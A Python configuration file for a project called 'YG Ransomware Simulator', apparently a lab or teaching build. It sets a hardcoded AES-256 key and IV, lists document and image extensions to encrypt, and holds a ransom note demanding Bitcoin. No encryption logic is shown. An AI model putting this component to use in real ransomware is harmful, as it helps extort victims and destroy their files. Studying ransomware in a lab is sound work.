# config.py

# AES key (32 bytes for AES-256)
AES_KEY = b'ThisIsA32ByteLongEncryptionKey!!'

# Initialization Vector (16 bytes)
AES_IV = b'ThisIs16ByteIV!!'

# Target file extensions to encrypt
TARGET_EXTENSIONS = ['.txt', '.pdf', '.docx', '.png', '.jpg', '.xlsx']

# Ransom message
RANSOM_MESSAGE = """
Your files have been encrypted by YG Ransomware Simulator.
To recover them, send 0.01 BTC to the wallet address below.

Once payment is made, enter the decryption key to unlock your files.
"""
